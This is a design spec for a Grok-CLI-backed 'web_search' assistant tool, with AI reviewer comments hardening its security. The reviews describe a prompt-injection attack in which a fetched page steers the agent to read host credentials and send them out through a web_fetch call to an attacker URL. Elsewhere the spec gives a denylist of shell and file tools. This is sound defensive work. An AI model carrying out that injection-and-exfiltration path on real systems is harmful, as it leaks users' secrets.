# Built-in `web_search` Tool (Grok CLI Research)

Status: Ready for implementation (post Keel spec-review iterations)  
Date: 2026-07-19  
Branch: `feature/web-search-grok-tool`

## 1. Summary

Add a **built-in** Assistant tool named `web_search` that shells out to the local **Grok Build CLI** in headless one-shot mode for live web and public X/Twitter research.

One tool is shared by:

1. **Traditional text agents** (e.g. `assistant`), via per-agent `toolAllowlist`
2. **Realtime voice**, via `voice.realtime.toolAllowlist`

The calling agent does **not** get separate tools for web vs X vs fetch. It passes a **natural-language question** in `query`. Grok uses its own web/X tools under a narrow allowlist. An optional `continue` flag resumes the prior Grok session for the same Assistant conversation.

## 2. Goals

- Single agent-facing tool for live internet research (web + public X).
- Usable from text chat and Realtime with the same tool name and schema.
- Prefer Grok’s research tools; **deny shell and nested agents**.
- Tool **description** requires natural-language questions (no heavy query rewriting).
- Multi-turn follow-ups via `continue: true` → Grok `--resume <sessionId>`.
- Config-only enablement (allowlists); no plugin package, panel, or CLI product surface.

## 3. Non-goals

- Plugin packaging, HTTP ops, generated CLI, or enable UI.
- Separate tools per Grok capability (`web_fetch`, `x_keyword_search`, …).
- Posting to X, DMs, private notifications, or write APIs.
- Running Grok on the Android client (server-side only).
- Guaranteeing every `x_*` tool is filterable via Grok `--tools` (prompt + allowlist best-effort).
- Deploying or restarting production/dev systemd as part of this change.

## 4. Background

CLI contract and invocation details originated in:

`/home/kevin/agent-context/repos/assistant/specs/grok-cli-web-x-search-agent-tool.md`

This design binds that CLI to Assistant’s **built-in tool host**.

## 5. Product surface

### 5.1 Tool name

`web_search`

### 5.2 Parameters

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `query` | string | yes | Natural-language question or research request. Not bare keyword lists. |
| `continue` | boolean | no | When true, resume the last Grok session for this Assistant conversation. Default false. |

`additionalProperties: false`.

### 5.3 Tool description (normative for the model)

Use text equivalent to:

> Search the live public web and public X/Twitter for current information.  
> Pass `query` as a full natural-language question or request  
> (e.g. "What is the weather in Austin today?" or "What has @user posted recently about robots?").  
> Do not pass bare keyword lists.  
> Set `continue` to true only when following up on the previous search in this conversation.

### 5.4 Result shape (to the model)

Successful JSON object (example):

```json
{
  "text": "…answer…",
  "continued": false,
  "sessionId": "optional-opaque-id-for-debug"
}
```

- `text` is the primary payload for chat display / Realtime speech.
- `continued` reflects whether resume was used.
- `sessionId` may be omitted from model-facing results if undesired; implementers may include a truncated id for debugging. Prefer not requiring the **calling** agent to manage Grok session IDs — resume is only via `continue`.

Errors: structured tool error with short, speakable message (e.g. invalid args, grok missing, timeout, non-zero exit, no prior session for continue).

## 6. Architecture

### 6.1 Registration

- Register in `registerBuiltInSessionTools` (or a dedicated helper it calls), same pattern as `voice_speak` / `attachment_send`.
- Always present on the built-in tool host when the host is created.
- **Visibility** is solely allowlist/denylist:

  - Agents: `agents[].toolAllowlist` includes `web_search`
  - Realtime: `voice.realtime.toolAllowlist` includes `web_search`

### 6.2 Execution

On `callTool("web_search", …)`:

1. Validate `query` (non-empty string after trim).
2. Resolve conversation key for Grok session storage (see §6.3).
3. If `continue === true`, look up stored Grok `sessionId`; if missing → error `no_prior_search`.
4. Build argv for Grok headless (see §7).
5. Run subprocess with timeout; capture stdout/stderr.
6. On exit 0, parse JSON (`--output-format json`); require usable `text`.
7. Persist returned Grok `sessionId` for this conversation key.
8. Return `{ text, continued }` to the tool host.

### 6.3 Session keying for `continue`

Store Grok session ids in **process memory** (Map) for v1:

| Caller | Key |
|--------|-----|
| Text agent | `ctx.sessionId` (chat session) |
| Realtime | `ctx.sessionId` as provided by voice service (today `voice:<conversationId>`) |

Do **not** use Grok’s bare `-c` / “latest in cwd” for resume — concurrent conversations would collide.

Stable `--cwd` for Grok: a server data subdirectory (e.g. under `DATA_DIR` / `envConfig.dataDir`), e.g. `<dataDir>/grok-web-search`, created if missing. Same cwd for all calls is fine because resume uses explicit `--resume`.

Process restart clears in-memory sessions → `continue: true` fails until a new search; acceptable for v1.

### 6.4 Realtime vs text policy

Same tool and schema. Host may apply **different timeouts / max-turns** based on context:

| | Realtime | Text agent |
|--|----------|--------------|
| Process timeout | **≤20s** (default 18s) | ~90–120s |
| `--max-turns` | Low (e.g. 6) | Higher (e.g. 12–16) |
| Optional `--rules` brevity | Spoken 1–3 sentences default | Slightly longer OK |

Detection (v1): there is no `isRealtime` on `ToolContext` today. Use a **shared constant** for the Realtime session key prefix (`voice:`), exported from the voice module (or a tiny shared constant used by both `VoiceService` and the web_search handler). Unit-test both timeout branches. Optionally add an explicit `ToolContext` field later; do not invent parallel detection schemes.

Realtime `ToolContext` may omit `toolCallId` / `requestId` / `turnId`; the handler must not require them.

**Latency UX:** Realtime `executeToolCall` awaits the tool before continuing speech. Cap Realtime hard at ≤20s so the provider is less likely to desync. The calling model (not this tool) may say a short filler before the tool call; the tool itself returns a short speakable error on timeout (e.g. “Research timed out”). No streaming bridge in v1.

Do **not** add a `mode` parameter for the calling agent in v1.

## 7. Grok CLI invocation

Binary: `grok` on `PATH`, or configurable override via env `ASSISTANT_GROK_BIN` (optional; default `grok`).

### 7.0 Spawn mechanics (normative — security)

**Must** use argv-array spawn with `shell: false`. Never interpolate `query` into a shell string.

```ts
spawn(grokBin, args, { shell: false, cwd: stableWorkdir, signal: abortSignal });
// args example:
// ['-p', query, '--disallowed-tools', denylist, '--output-format', 'json', ...]
```

- Each flag and value is a separate array element; `query` is its own element after `-p`.
- Honor `ctx.signal` when present; always enforce a process timeout via abort/kill.
- Do **not** reuse `executeShellCommand` / `/bin/sh -c` helpers.

### 7.1 Tool filtering strategy (web + X, no shell)

Grok headless `--tools` is a **strict allowlist** of built-in tool ids. Using `--tools "web_search,web_fetch"` would **remove** other tools, including X tools that are a product goal.

**v1 decision:**

1. **Do not** pass `--tools` (default research tool set remains, including web and X when available).
2. **Primary tool-list boundary:** `--disallowed-tools` removes dangerous **built-in** tools by id.
3. **Permission mode for headless:** use `--permission-mode bypassPermissions` (same family as always-approve) so `web_fetch` and X tools are not cancelled for prompting. In headless default mode, non-auto-approved tools are cancelled; only a small set (including `web_search` alone) is auto-approved. Without bypass, X/fetch research is non-functional.
4. Thin `--rules` steer web vs X; rules are **not** a security control.

This reconciles earlier “no yolo” guidance: we still **do not** leave shell/edit available. Bypass is only safe **with** the denylist (and deny rules) below. Deny rules and hooks still apply under bypass.

#### Denylist (normative, unconditional)

Single constant string for `--disallowed-tools` (always the same argv; do not gate “if present”):

```text
run_terminal_cmd,Agent,search_replace,write,read_file,list_dir,grep,memory_search,image_gen,image_edit,image_to_video,reference_to_video
```

**Why local reads are denied:** Under bypassPermissions, `read_file` / `list_dir` / `grep` are otherwise available and auto-approved as “read-only.” Combined with `web_fetch` and untrusted returned content, that would enable reading host secrets into the research channel. Web/X research does **not** need local filesystem tools, so deny them. Also deny `memory_search` (cross-session memory is out of scope for this tool).

**Residual (web_fetch):** `web_fetch` is intentional for research. It remains an egress primitive. Closing local-file tools **removes the local-read half of classic secret exfil**, but does **not** by itself prove SSRF hardening (`file://`, loopback, link-local, RFC1918). Implementer must verify the installed Grok’s `web_fetch` scheme/host behavior once (document findings in a short code comment or test note). Grok `--sandbox` does **not** fully constrain `web_fetch` egress—do not claim otherwise. Optional later: `WebFetch(domain:…)` allow rules if product needs host allowlists.

Unknown ids are treated as no-ops by Grok’s denylist (if a future Grok version errors on unknown ids, drop the unknown names in a follow-up). Keep one constant in code.

#### MCP boundary

Headless docs: **MCP meta-tools remain available** unless denied and are retained even with `--tools` / `--disallowed-tools`.

v1 requirements:

- **Deploy prerequisite:** host Grok config for the agent-server user should not enable untrusted MCP servers for research calls.
- **Belt-and-suspenders argv:** pass permission deny for MCP tools when supported, e.g. `--deny 'MCPTool(*)'` (or the current Grok-equivalent deny pattern documented for MCP). If the installed Grok rejects an unsupported deny pattern, document the tested flag and fall back to the deploy prerequisite only.
- Document both in CONFIG.md.

Optional later: OS sandbox profile if Grok’s `--sandbox` proves reliable for this host.

### 7.2 New search (`continue` false/absent)

Logical argv (not a shell string):

```text
grok
  -p <query>
  --permission-mode bypassPermissions
  --disallowed-tools run_terminal_cmd,Agent,search_replace,write,read_file,list_dir,grep,memory_search,image_gen,image_edit,image_to_video,reference_to_video
  --deny MCPTool(*)
  --output-format json
  --cwd <stable-workdir>
  --max-turns <N>
  --rules <fixed-rules>
```

(`--deny MCPTool(*)` may be adjusted to the exact pattern accepted by the installed Grok; implementer verifies once and freezes the constant.)

### 7.3 Continue

Same argv plus:

```text
  --resume <stored-session-id>
```

### 7.4 Fixed rules (thin, not query rewriting)

Append via `--rules` approximately:

```text
Use web_search and web_fetch for general web facts.
Use X tools for posts, accounts, and threads when the question is about X/Twitter.
Do not run shell commands or edit files.
Prefer current information over stale knowledge.
```

Realtime may append: `Answer for spoken voice in 1–3 sentences unless the user asked for detail.`

**Do not** rephrase or heavily wrap `query`. Pass the agent’s natural-language question as the `-p` argument value.

### 7.5 Security summary

- Argv-array spawn only (`shell: false`).
- `--permission-mode bypassPermissions` only with a hard denylist (and MCP deny when available)—not unrestricted yolo.
- Denylist removes shell, nested Agent, file mutation, **local file reads/search**, image gen.
- MCP: deny rule + deploy prerequisite (no untrusted MCP on host Grok).
- Treat returned `text` as untrusted research for the outer model.
- Do not log full query/answer at info level; debug optional.

### 7.6 Auth / deploy prerequisite

Host process user must already have Grok credentials (`~/.grok/auth.json` and/or `XAI_API_KEY`). Document in CONFIG.md. Failure modes: exit non-zero → tool error, no invented facts.

Also document:

- Grok MCP servers for that user should be empty or trusted only.
- **`bypassPermissions` must not be locked off** for the agent-server user (check `~/.grok/requirements.toml` and `/etc/grok/requirements.toml` for `disable_bypass_permissions_mode` / legacy `yolo = false`). If locked, headless `web_fetch`/X degrade silently; live acceptance tests should catch this.

### 7.7 dataDir / envConfig

`ctx.envConfig` is optional on the type. Handler must guard undefined: if missing `dataDir`, fall back to `os.tmpdir()/assistant-grok-web-search` or fail with a clear configuration error. Prefer `ctx.envConfig.dataDir` when present.

## 8. Config changes

### 8.1 Example / docs

- `packages/agent-server/data/config.example.json`: add `web_search` to sample agent allowlist(s) and to `voice.realtime.toolAllowlist` alongside existing entries.
- `docs/CONFIG.md`:
  - Document **`voice.realtime.toolAllowlist` / `toolDenylist`** (Realtime opt-in tool surface).
  - Document built-in tools including **`web_search`**: purpose, parameters, Grok prerequisites, distinction from `search_*` (in-app search plugin).

### 8.2 Running instance (this environment)

Update `/home/kevin/.assistant/data/config.json` (DATA_DIR for `assistant.service`):

- Agent `assistant`: add `web_search` to `toolAllowlist`
- `voice.realtime.toolAllowlist`: add `web_search` (keep existing entries such as `lists_*`)

**Note:** Without a service restart, the running process will not load config changes. This work **does not** restart services; enablement is prepared for the next deploy/restart.

## 9. Testing

- Unit tests with mocked subprocess (argv capture, `shell: false`):
  - happy path JSON parse + session store
  - `continue` without prior session → error
  - `continue` with prior session → argv includes `--resume`
  - non-zero exit → tool error
  - empty query → invalid_arguments
  - Realtime vs text timeout / max-turns selection (prefix constant)
  - argv includes denylist and does **not** pass restrictive `--tools` that would drop X
  - spawn uses `shell: false` (assert mock options)
- Optional live tests when `ASSISTANT_GROK_LIVE_TEST=1`:
  - web fact query returns non-empty text
  - X-oriented query (e.g. recent public posts about a well-known handle/topic) can succeed when X tools are available (soft assert / skip if environment lacks X)

## 10. Changelog

Under `## [Unreleased]` → `### Added`:

- Built-in `web_search` tool wrapping Grok CLI for live web/X research, with optional `continue` resume, for text agents and Realtime allowlists.

(PR number filled when PR is opened.)

## 11. Acceptance criteria

1. Built-in tool `web_search` appears in tool host list when registered.
2. Agent with `web_search` on allowlist can call it; without allowlist entry, call is denied.
3. Realtime allowlist can expose the same tool independently of agent config.
4. New search invokes Grok **without** a restrictive `--tools` allowlist that would drop X; denylist removes shell/agent/file-mutation tools; returns `text`.
5. Second call with `continue: true` in the same conversation resumes the stored Grok session.
6. `continue: true` with no prior session returns a clear error.
7. Tool description instructs natural-language questions; implementation does not invent multi-tool surface for web vs X.
8. Subprocess uses argv-array spawn with `shell: false`; model-controlled `query` is never shell-interpolated.
9. Realtime path uses ≤20s timeout and speakable timeout errors.
10. Unit tests cover the above with mocked Grok; optional live web/X when env flag set.
11. Running config prepared for `assistant` + Realtime; no deploy/restart required for merge readiness.
12. No naming collision with `search_*` in-app search plugin.

## 12. Implementation plan

1. Add design doc (this file); Keel `spec-review-loop` until clean.
2. Implement Grok runner + session map + built-in registration.
3. Tests + CONFIG/example updates.
4. Patch running `config.json` allowlists.
5. Keel `iterative-review` on the implementation; fix agreed findings.
6. Commit on feature branch; **do not** deploy or restart.

## 13. Open questions (resolved for v1)

| Question | Decision |
|----------|----------|
| Plugin vs built-in? | **Built-in** |
| Separate tools for X? | **No** — one tool |
| Prefix/rewrite query? | **No** — description + thin `--rules` only |
| Resume mechanism? | **`continue` + stored session id + `--resume`** |
| Session storage? | **In-memory Map, process-local** |
| Enablement? | **Allowlists only** |
| Strict `--tools` web-only? | **No** — omit `--tools`; denylist dangerous tools so X remains available |
| Spawn? | **argv-array, `shell: false` only** |
| Realtime timeout? | **≤20s** |
| Permission mode? | **`bypassPermissions` + denylist** (required for headless web_fetch/X) |
| MCP? | **Deny MCP tools if supported; require trusted host Grok MCP config** |

## Correspondence

### 2026-07-19T17:58:58.883Z - Reviewer: claude-default

Status: **changes-requested**

Reviewed against the current codebase. The core wiring is sound and implementable: `registerBuiltInSessionTools` (`builtInTools.ts:1183`) is the right home and matches the `voice_speak`/`attachment_send` pattern; the built-in host is created once in `createToolHost` and is **shared with Realtime** (`index.ts:176`), so an allowlisted `web_search` is reachable from both text and voice. `ToolContext.sessionId` is present and required, `ctx.envConfig` is populated on both the chat tool-call path (`ws/toolCallHandling.ts:455`) and the Realtime path (`index.ts:184`), so `<envConfig.dataDir>/grok-web-search` for `--cwd` works. Allowlists are glob-matched (`tools/scoping.ts`), support `lists_*`-style wildcards, and Realtime is explicit opt-in (empty ⇒ no tools), so `web_search` must be added explicitly to `voice.realtime.toolAllowlist` exactly as §8 states. The Realtime `sessionId` is confirmed as `voice:<conversationId>` (`voice/service.ts:493`), matching §6.3/§6.4. **No conflict with the `search_*` plugin**: that plugin registers `search_search`/`search_scopes`, `web_search` does not match the `search_*` prefix, and built-in tools take execution precedence in `CompositeToolHost`; the only theoretical shadow would be a future plugin whose id is `web` with a `search` operation.

Blocking/again-worth-resolving items before implementation (details in structured findings):

1. **[High] `--tools "web_search,web_fetch"` likely disables X search** — a headline goal (§1/§2) and advertised in the tool description (§5.3 `@user posted…`). If `--tools` is a strict enable-list, `x_*` tools are excluded; the background contract even says `x_*` filtering "may be incomplete," so they can't be reliably enumerated into `--tools`. Acceptance #4 tests only web, so this ships broken and untested. Pin down Grok's `--tools` semantics, choose allowlist-with-x_* vs denylist-only, and add an X-specific acceptance/live test.
2. **[Medium] Denylist `run_terminal_cmd,Agent` is incomplete and its relationship to `--tools` is unspecified.** If `--tools` is dropped/loosened to enable X, the denylist becomes the sole security boundary and does not cover file write/edit tools (the §7.3 rules literally say "do not … edit files," implying such a tool exists). Enumerate all dangerous tool ids, state which flag is authoritative, and add an acceptance criterion that shell/file-mutation tools are not invokable. Prompt `--rules` are not a security control.
3. **[Medium] Realtime timeout blocks the live turn.** `executeToolCall` awaits `callTool` with no outer timeout/cancellation (`voice/service.ts:496`), so a 25–45s Grok subprocess (§6.4) means up to 45s of dead air with no spoken filler, and the Realtime provider's tolerance for multi-second synchronous tool latency is unvalidated. Tighten the Realtime cap, validate provider behavior, ensure the timeout error is a short speakable message, and note there is no per-tool rate limit on the Realtime path (unlike the chat path).
4. **[Medium] Mandate argv-array spawn, never a shell.** `query` is fully model-controlled; the §7 `grok -p "<query>"` bash snippets and the nearby `executeShellCommand` helper (which uses `/bin/sh -c`) invite a shell-injection bug. Require `spawn('grok', [argv…], { shell: false })` with `ctx.signal` + `setTimeout` kill.
5. **[Low] Realtime detection is prefix-sniffing with no ToolContext flag.** Confirmed no caller-type field exists; centralize the `voice:` constant, add tests for both timeout branches, and note the Realtime ctx omits `toolCallId`/`requestId`/`turnId` so the handler must not depend on them.
6. **[Low] Docs gap.** CONFIG.md has no `voice.realtime` section today, so §8.1 must add documentation for the `voice.realtime.toolAllowlist` field itself (not just a `web_search` blurb), and the handler should guard `ctx.envConfig` being undefined (optional on the type).

### 2026-07-19T18:05:56.315Z - Reviewer: claude-default

Status: **changes-requested**

All six findings from the prior review are resolved well: the strict-`--tools` trap is replaced with a denylist-authoritative model (§7.1), argv-array `shell: false` spawn is now normative (§7.0), the Realtime cap is ≤20s with a speakable timeout (§6.4), the `voice:` prefix is a shared constant with both timeout branches tested (§6.4, §9), CONFIG.md coverage and the `ctx.envConfig` guard are specified (§8.1, §7.7), and X acceptance/live tests were added (§9, §11). I verified the revised invocation against the installed Grok headless docs (`~/.grok/docs/user-guide/14-headless-mode.md`, `22-permissions-and-safety.md`). Confirmed correct: `--disallowed-tools` wins over `--tools` and is retained (14-headless §Tool Filtering); the shell id is `run_terminal_cmd`; `search_replace`/`write` are the file-edit ids; `Agent`/`Agent(explore)` entries block subagents. Two new blocking/again-worth-resolving issues surfaced by that doc check, plus one low:

1. **[High] No permission mode specified → `web_fetch` and X tools get cancelled in headless, so the X capability is still non-functional.** Per `22-permissions-and-safety.md`, only a fixed read-only set is auto-approved — **`web_search` is on it, but `web_fetch` and the `x_*` tools are not.** In headless `-p`, a tool call that would prompt is **cancelled and reported to the model** (14-headless / permissions §"In headless runs"), and the default mode prompts for anything not pre-approved (`dontAsk` would deny). §7.2's argv sets **no `--permission-mode` and no `--allow` rules**, and §7.5 bans always-approve — so under the effective default, only bare `web_search` runs; `web_fetch` and every `x_*` tool are cancelled. That defeats the headline web+X goal (§1/§2) advertised in the tool description (§5.3), and acceptance #4 wouldn't catch it (it only checks `--tools`/denylist, not that X actually executes). Resolve by specifying permission handling explicitly: either (a) since the denylist already removes shell/agent/edit/write/media and `deny` rules + hooks still apply under always-approve, use `--permission-mode bypassPermissions` on the hardened toolset (this contradicts §7.5's blanket ban — reconcile it), or (b) keep default/`dontAsk` and pass explicit `--allow` rules pre-approving `web_fetch` and the X tools (identify their exact permission prefixes/ids first). Add an acceptance criterion that a live X query actually returns X-sourced content (not a cancelled/empty result).

2. **[Medium] MCP meta-tools bypass `--disallowed-tools`, so the "authoritative security boundary" (§7.1) is incomplete.** The headless docs state MCP meta-tools "remain available unless denied" and are "always-on" retained even with `--tools`/`--disallowed-tools` (14-headless §Tool Filtering). If the host Grok install has any MCP servers configured, their tools stay callable during a `web_search` run and are not covered by the spec's built-in-id denylist — and would be auto-approved if resolution 1(a) adopts `bypassPermissions`. Add a prerequisite that the host Grok config has no untrusted MCP servers (verify `~/.grok`), and/or add `--deny 'MCPTool(*)'`, and consider a `--sandbox` profile (14-headless line 44) for OS-level filesystem/network confinement as defense-in-depth.

3. **[Low] Reconcile conditional vs unconditional denylist ids.** §7.1 says include media/mutation ids "if present in the install," but §7.2's concrete argv lists `image_gen,image_edit,image_to_video,reference_to_video` unconditionally. The docs don't state whether `--disallowed-tools` ignores unknown ids or errors. Confirm Grok tolerates denylisting absent tools (removing a non-present tool should be a no-op); if it can error, gate those ids dynamically or drop the ambiguity so an install lacking media tools doesn't fail the spawn.

### 2026-07-19T18:10:37.443Z - Reviewer: claude-default

Status: **changes-requested**

All three findings from review-2 are resolved and I verified the mechanics against the installed Grok docs (`14-headless-mode.md`, `22-permissions-and-safety.md`, `18-sandbox.md`): `--permission-mode bypassPermissions` is a valid flag value and, crucially, **`deny` rules and hooks still apply under it** (22-permissions §Permission Modes) — so §7.1's reconciliation of "no yolo" with a hardened bypass is sound, and the `--deny 'MCPTool(*)'` belt-and-suspenders is real (`MCPTool` is a recognized deny prefix; `--deny` uses `ToolPrefix(glob)` syntax). The unconditional denylist constant (§7.1) and MCP deploy prerequisite (§7.6) are good. One new **high** security gap introduced by adopting `bypassPermissions`, plus one low:

1. **[High] Lethal trifecta: local file reads + arbitrary `web_fetch` egress + untrusted fetched content enable secret exfiltration.** `read_file`, `list_dir`, and `grep` are on Grok's "never prompt / auto-approved in every mode" list (22-permissions §Operations That Never Prompt) — so they run regardless of permission mode and are **not** in the spec's denylist, which only removes write/shell/agent/media. Under §7.2's `bypassPermissions`, `web_fetch` is auto-approved and can fetch **any** URL/host (WebFetch rules glob the whole URL unless deny-restricted). §7.5 already declares returned text untrusted, i.e. the design acknowledges prompt-injection exposure from fetched web/X pages. That is the full lethal trifecta: an injected page can steer Grok to `read_file` a host secret (e.g. `~/.grok/auth.json`, `XAI_API_KEY` in env-derived files, `~/.assistant/data/config.json`) and exfiltrate it via a crafted `web_fetch('https://attacker/collect?d=<secret>')`. Note `--cwd <dataDir>/grok-web-search` does **not** confine reads — only an OS `--sandbox` profile does (18-sandbox uses Landlock/Seatbelt). Web/X research needs no local filesystem access, so the fix is cheap and lossless: (a) remove local read tools — add `read_file,list_dir,grep` to `--disallowed-tools` and/or `--deny 'Read(*)' 'Grep(*)'` (deny still applies under bypass); and/or (b) run under a network/filesystem-restricting `--sandbox` profile (e.g. `strict`/`read-only`, which also block child-process network on Linux) and/or constrain egress with `WebFetch(domain:...)` allow-listing. Add an acceptance criterion that Grok cannot read arbitrary host files during a web_search.

2. **[Low] `bypassPermissions` can be locked off at the host, silently disabling web_fetch/X.** Per 22-permissions, an admin or user `requirements.toml` (or legacy `[ui] yolo = false`), at `~/.grok/requirements.toml` or root-owned `/etc/grok/requirements.toml`, can turn always-approve off so `--permission-mode bypassPermissions` won't enable it — and a catch-all managed `allow` is ignored when always-approve is locked. The entire X/fetch capability then silently degrades to `web_search`-only. Add to §7.6 deploy prerequisites: confirm the agent-server user's Grok config does not lock off `bypassPermissions`; and rely on the live X acceptance test (§9/§11) to catch a locked host. Optionally note the more robust alternative — default mode + explicit `--allow` rules for `WebFetch`/X — if the X tools' permission class can be pinned down (it is not enumerated among the recognized `Read/Edit/Grep/MCPTool/WebFetch/WebSearch` classes, which is why bypass was chosen).

### 2026-07-19T18:14:33.526Z - Reviewer: claude-default

Status: **changes-requested**

Both review-3 findings are resolved: the denylist now removes `read_file,list_dir,grep` with a clear rationale (§7.1), and §7.6 documents the `bypassPermissions`-not-locked prerequisite. I re-verified the tool surface against the installed Grok docs and the mitigation holds where it counts: Grok's built-in read/search tool ids are exactly `read_file` / `list_dir` / `grep` (01-getting-started §Tools), and the hooks doc confirms `Glob` and `ListDir` both map to `list_dir` (10-hooks) — so there is **no separate `glob` id slipping past the denylist** — and `Agent` correctly blocks the `spawn_subagent` tool. The design is very close. Two **low** residuals remain, both about the one channel that is inherent to a web-research tool — `web_fetch`:

1. **[Low] `web_fetch` is itself an unrestricted read/egress primitive; the "closes the exfil path" claim (§7.1) is contingent on its SSRF/scheme handling.** Denying `read_file`/`list_dir`/`grep` shuts the *file-tool* read leg, but `web_fetch` remains auto-approved under `bypassPermissions` and the docs are silent on whether it rejects non-`http(s)` schemes (`file://`) and blocks loopback/link-local/private targets (`127.0.0.1`, `169.254.169.254` metadata, internal admin endpoints). If it does not, an injected page can still read a local/internal secret **via `web_fetch` itself** and exfiltrate it — the read-tool denial does not cover that. Crucially, `--sandbox` does **not** help here: per 18-sandbox line 189, "web_search, web_fetch, and the LLM API always have network access," so `restrict_network` never constrains `web_fetch` egress (it only blocks child-process network like `curl`). The one sandbox lever that *would* help is a custom-profile kernel `deny` list over credential paths (18-sandbox line 36, e.g. `**/*.pem`, `~/.grok/auth.json`), which blocks even in-process `file://` reads. Recommendation: (a) qualify the §7.1 line-183 claim to "closes the *file-tool* read leg" rather than the whole exfil path; (b) require the implementer to verify Grok's `web_fetch` rejects `file://` and private/loopback/link-local hosts, and document the result as an accepted residual (open external egress is unavoidable for open web research); (c) correct §7.1's "optional later: OS sandbox profile" note to reflect that a sandbox constrains filesystem reads (custom `deny` list), not `web_fetch` egress.

2. **[Low] `memory_search` remains reachable and is not needed for web/X research.** Grok's default set includes `memory_search` (cross-session memory; 01-getting-started §Tools), which is not in the denylist. During an untrusted-content run it is a minor additional read/exfil surface (prior-session memory for the agent-server user). Add `memory_search` to the denylist constant (and `todo_write` is harmless and may stay); web/X research does not need it. This is belt-and-suspenders, not a blocker.

Everything else — wiring, allowlists, session keying, Realtime ≤20s/speakable timeout, shell-free argv, MCP deny + prerequisite, tests, and no `search_*` collision — is ready to implement. Folding in the two low items above (primarily the `web_fetch` SSRF verification + honest wording of the §7.1 claim) makes this clean.

### 2026-07-19T18:19:46.787Z - Reviewer: claude-default

Status: **clean**

Both review-4 low findings are resolved. `memory_search` is now in the denylist constant (§7.1) and the §7.2 argv. The `web_fetch` residual is documented honestly (§7.1 "Residual (web_fetch)"): it frames read-tool denial as removing only "the local-read half of classic secret exfil," calls out the unproven SSRF surface (`file://`, loopback, link-local, RFC1918) as a one-time implementer verification, and explicitly states that `--sandbox` does not fully constrain `web_fetch` egress — no false sandbox claim remains, and the §7.1 line-183 wording is no longer overstated.

The design is ready to implement. Summary of the full review arc, all verified against the codebase and the installed Grok docs (`14-headless-mode.md`, `22-permissions-and-safety.md`, `18-sandbox.md`, `01-getting-started.md`, `10-hooks.md`):

- **Wiring/implementability:** built-in registration mirrors `voice_speak`/`attachment_send`; the built-in host is shared with Realtime; `ctx.sessionId` and `ctx.envConfig.dataDir` are available on both chat and Realtime paths; allowlists glob-match and Realtime is explicit opt-in.
- **Security:** `shell: false` argv spawn, no query shell-interpolation; `bypassPermissions` reconciled with "no yolo" and safe only because deny rules still apply under bypass; denylist ids verified real (`run_terminal_cmd`, `Agent`→subagents, `search_replace`/`write`, `read_file`/`list_dir`/`grep` with `glob` subsumed by `list_dir`, `memory_search`, media); MCP deny + deploy prerequisite; `bypassPermissions`-not-locked prerequisite; untrusted-text handling; `web_fetch` egress residual honestly scoped with implementer verification.
- **continue/session keying, Realtime timeouts, config enablement, tests, `search_*` non-collision:** all sound as specified.

No blocking or non-blocking findings remain. Approved to proceed to implementation (Keel `iterative-review` will still cover the code).
